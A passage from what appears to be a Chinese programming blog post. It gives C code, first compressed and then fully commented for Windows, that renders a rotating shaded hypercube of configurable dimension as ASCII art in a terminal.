class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                            ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                        inside=<span class="number">0</span>;&#125;</span><br><span class="line">                <span class="keyword">if</span>(inside)&#123;<span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                    <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                        currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                        <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                            alpha=<span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                            dis[sy][sx]=currentDis;</span><br><span class="line">                            out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);<span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);usleep(<span class="number">30000</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        这代码是给人看的？¯\_(ツ)_/¯    </div>    <div class='spoiler-content'>        <p>确实不是给你看的，以上代码已经把格式压缩到最小了，只是看起来比较好看而已，以下是以下是带注释与测试代码的源码，请在windows下编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0<span class="comment">//立方体边长</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55<span class="comment">//荧幕大小</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5<span class="comment">//遍历方块的步长</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02<span class="comment">//物体旋转速度</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001<span class="comment">//判定点是否在平面内时的方程阈值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5<span class="comment">//维数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0<span class="comment">//是否使用透明材质，同时是透明的倍率，四维推荐0.75，五维推荐0.6</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//坐标系说明：x向右，y向下，z向前</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;<span class="comment">//阴影字符集十一个，便于选取</span></span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;<span class="comment">//透视投影时的光源距离</span></span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;<span class="comment">//平行光向量，选取了一个比较舒服的打光</span></span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;<span class="comment">//确定旋转基准，指定参与旋转的方向，两个一组，一组中小的在前大的在后</span></span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">2</span> , <span class="number">1</span> &#125;;<span class="comment">//对应上边的配速倍率</span></span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;<span class="comment">//水平旋转 前后倾斜 左右倾斜，注意用弧度角，如 pi/4</span></span><br><span class="line"><span class="comment">/*initialObj[已删除]：正方体初始摆放的角度；initialObj：摄像机初始摆放的角度</span></span><br><span class="line"><span class="comment">旋转顺序：initialObj → rotateAround → initialCam</span></span><br><span class="line"><span class="comment">initialObj感觉用处不大，删了算了*/</span></span><br><span class="line"><span class="comment">/*计算向量模长</span></span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line"><span class="comment">Par:</span></span><br><span class="line"><span class="comment">    vec[]：向量</span></span><br><span class="line"><span class="comment">    len：元素个数</span></span><br><span class="line"><span class="comment">--------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    COORD pos=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//光标回零</span></span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;<span class="comment">//单位化平行光向量</span></span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;<span class="comment">//记录亮度，映射到字符集 | 记录三维投影后到屏幕最小距离，由此判断遮罩关系</span></span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//从坐标原点(屏幕左上角)偏移到屏幕中心所需的偏移量</span></span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="comment">/*  面数公式解释</span></span><br><span class="line"><span class="comment">        每个 n 维正方体中的每个 m 维边界都会被 n-m 个 m+1 维边界共用。比如正六面体中，每条棱被两个面共用，而每个顶点被三条棱共用。</span></span><br><span class="line"><span class="comment">        这样算来，对于任意一个 n 维的正方体，计算其不重复的二维正方形表面的数量应该为：</span></span><br><span class="line"><span class="comment">          6x8x10x...x(2n)/(2*3*...*(n-2))</span></span><br><span class="line"><span class="comment">        =(2^(n-2))*(n!)/2/(n-2)!</span></span><br><span class="line"><span class="comment">        =(2^(n-3))*n*(n-1)*/</span></span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;<span class="comment">//顶点个数*维数</span></span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];<span class="comment">//相邻顶点集，如：三维中0号顶点与1，3，7相邻，则前dimension个元素为1，3，7 | 同理，法向量对应三角形面的三个vex的index</span></span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];<span class="comment">//当前顶点坐标 | 原始顶点坐标 | 投影后顶点坐标 | 临时</span></span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];<span class="comment">//法向量结果集</span></span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));<span class="comment">//初始化</span></span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;<span class="comment">//这个算法需要有前车之鉴</span></span><br><span class="line">    <span class="comment">/*得到顶点坐标</span></span><br><span class="line"><span class="comment">    用上一向量一个元素变号，使其与之前任一向量都不同，该向量即要找的下一个顶点</span></span><br><span class="line"><span class="comment">    向量不同 = 元素至少有一个不相同*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;<span class="comment">//遍历尝试改变vexIndex-1向量的每一单个元素正负号，执行条件：d为假</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;<span class="comment">//遍历每个向量，执行条件：d为真，每次初始化d为假</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)<span class="comment">//遍历比较vexIndex-1向量与之前向量的元素</span></span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*测试代码：打印vex</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vex[i*dimension+j]&gt;=0)printf(&quot; %.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;%.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;Vex Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">/*得到相邻顶点，相邻顶点在vex中的index存储到vexLink中</span></span><br><span class="line"><span class="comment">    先在vexLink中已经建立link的部分找有没有之前link到过当前正在建立link的点，有则直接加入当前的link</span></span><br><span class="line"><span class="comment">    linkIndex：这是第几个已经建立link的点</span></span><br><span class="line"><span class="comment">    在link数量达到dimension之前，用当前向量与之前的向量作比较，如果_只_更_改_一_个_符_号_就可以匹配，则加入link，直到当前向量的link满dimension个*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;<span class="comment">//vexIndex：当前正在建立link的点 | n：已经建立到第几个link了</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;<span class="comment">//遍历当前向量之后的每个向量 || difference：存在不一样的元素的数量</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)<span class="comment">//遍历被比较向量中的每个元素</span></span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*测试代码：打印vexLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vexLink[i*dimension+j]&gt;=10)printf(&quot;%d, &quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot; %d ,&quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;vexLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">//得到面对应的三个点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)<span class="comment">//cur n 表示指向第几个顶点，normalIndex表这是已经找到的第几个三角形</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;<span class="comment">//pDiag(Plane Diagonal)表是否为平面对角点，即cur1通过Link索引，在第二次可以索引到cur2</span></span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)<span class="comment">//第一次索引的偏移</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)<span class="comment">//第二次索引的偏移</span></span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)<span class="comment">//i指向normalLink中的向量</span></span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])<span class="comment">//cur1与第i个normalLink中存在元素重合？</span></span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))<span class="comment">//cur2与第i个normalLink中存在元素重合？</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;<span class="comment">//public[j]与第i个normalLink中存在元素重合？</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;</span><br><span class="line">                    